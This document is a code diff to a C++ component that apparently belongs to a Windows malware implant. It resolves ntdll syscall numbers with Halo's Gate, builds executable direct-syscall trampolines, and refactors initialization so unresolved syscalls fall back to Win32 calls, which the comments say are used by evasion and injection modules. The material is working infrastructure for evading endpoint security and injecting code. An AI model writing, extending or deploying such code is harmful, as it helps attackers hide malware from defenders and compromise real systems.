@@ -231,7 +231,7 @@ static DWORD ResolveSSN(const NtdllMap& m,
 // ============================================================
 static PVOID  g_TrampolinePool  = nullptr;
 static size_t g_TrampolineCount = 0;
-constexpr size_t MAX_STUBS = 16; // capacity; current RESOLVE calls = 11
+constexpr size_t MAX_STUBS = 16; // pool capacity; 11 entries resolved today
 constexpr size_t STUB_LEN  = 11;
 
 static PVOID BuildTrampoline(DWORD ssn) {
@@ -261,7 +261,6 @@ static PVOID BuildTrampoline(DWORD ssn) {
 
 static VOID FinalizeTrampolinePool() {
     if (!g_TrampolinePool || g_TrampolineCount == 0) return;
-    constexpr size_t STUB_LEN = 11;
     size_t totalBytes = STUB_LEN * g_TrampolineCount;
     DWORD oldProt = 0;
     VirtualProtect(g_TrampolinePool, totalBytes, PAGE_EXECUTE_READ, &oldProt);
@@ -316,20 +315,12 @@ BOOL InitializeSyscalls() {
     std::vector<ExportSlot> exports;
     if (!BuildExportList(m, exports)) return FALSE;
 
-    // Critical: implant cannot function without these three.
-    // If they fail even with Halo's Gate, give up.
-#define RESOLVE(sym, field)                                      \
-    do {                                                         \
-        DWORD _ssn = ResolveSSN(m, exports, sym);               \
-        if (_ssn == DWORD(-1)) return FALSE;                     \
-        PVOID _t = BuildTrampoline(_ssn);                        \
-        if (!_t) return FALSE;                                   \
-        g_Syscalls.field =                                       \
-            reinterpret_cast<decltype(g_Syscalls.field)>(_t);   \
-    } while (0)
-
-    // Optional: skip silently if SSN can't be found; injection falls back
-    // to Win32 equivalents when these are null.
+    // Every entry below is optional by design. A syscall number that cannot be
+    // resolved is left null and the caller uses the Win32 equivalent instead --
+    // each call site in evasion.cpp and injection.cpp null-checks first. So
+    // initialization only fails outright up above, when ntdll can neither be
+    // read from disk nor mapped from the loaded module, or its export table
+    // will not parse.
 #define RESOLVE_OPT(sym, field)                                  \
     do {                                                         \
         DWORD _ssn = ResolveSSN(m, exports, sym);               \
@@ -358,7 +349,6 @@ BOOL InitializeSyscalls() {
 
     FinalizeTrampolinePool();
 
-#undef RESOLVE
 #undef RESOLVE_OPT
     return TRUE;
 }
